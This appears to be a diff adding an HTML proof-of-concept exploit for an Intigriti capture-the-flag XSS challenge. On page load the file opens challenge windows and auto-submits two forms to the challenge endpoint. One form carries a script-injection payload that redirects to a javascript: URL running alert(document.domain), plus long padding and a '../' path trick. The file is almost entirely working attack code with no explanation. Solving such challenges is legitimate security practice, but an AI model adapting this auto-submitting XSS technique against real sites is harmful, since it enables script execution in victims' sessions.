@@ -1,0 +1,31 @@
+
+<!DOCTYPE html>
+<html>
+<head>   
+</head>
+
+<body>
+        <form method="post" action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php" id="myForm1" target="_blank">
+        <input type="hidden" name="token" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+        <input class="input is-primary" type="text" name="FirstText" value="test" size="100px">
+        <input class="input is-primary" name="Hashing" type="text" value="MD5" size="100px">
+        </form>
+
+        <form id="myForm2" method="post" action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php" target="TheWindow">
+        <input type="hidden" name="token" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+        <input class="input is-primary" type="text" name="FirstText" size="100px" value="<script>location=/javascript:alert%28document.domain%29/.source;</script>">
+        <input class="input is-primary" name="Hashing" type="text" size="100px" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+        </form>
+        
+        <script type="text/javascript">
+            window.open("https://challenge-0322.intigriti.io/challenge/LoveSender.php");
+
+            setTimeout(function() {myForm1.submit();}, 1000);
+
+            setTimeout(function(){window.open("https://challenge-0322.intigriti.io/challenge/test/../LoveSender.php");} , 2000);
+
+            setTimeout(function() {myForm2.submit();}, 3000);
+        </script>
+
+</body>
+</html>
